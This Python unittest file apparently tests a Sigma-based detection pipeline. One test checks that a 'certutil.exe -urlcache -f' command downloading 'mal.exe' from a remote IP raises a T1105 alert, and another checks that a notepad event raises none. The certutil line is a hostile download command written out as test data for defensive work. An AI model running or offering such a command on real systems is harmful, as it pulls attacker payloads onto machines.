import unittest
from engine.sigma_evaluator import init_pipeline

class TestDetectionPipeline(unittest.TestCase):
    def setUp(self):
        self.pipeline = init_pipeline()

    def test_certutil_detection(self):
        malicious_event = {
            "host": "wk-10",
            "command_line": "certutil.exe -urlcache -f http://198.51.100.1/mal.exe",
            "user": "analyst"
        }
        alerts = self.pipeline.process_event(malicious_event)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0]["mitre_technique"], "T1105")

    def test_benign_event_no_alert(self):
        benign_event = {
            "host": "wk-10",
            "command_line": "notepad.exe C:\\Users\\analyst\\notes.txt",
            "user": "analyst"
        }
        alerts = self.pipeline.process_event(benign_event)
        self.assertEqual(len(alerts), 0)

if __name__ == "__main__":
    unittest.main()
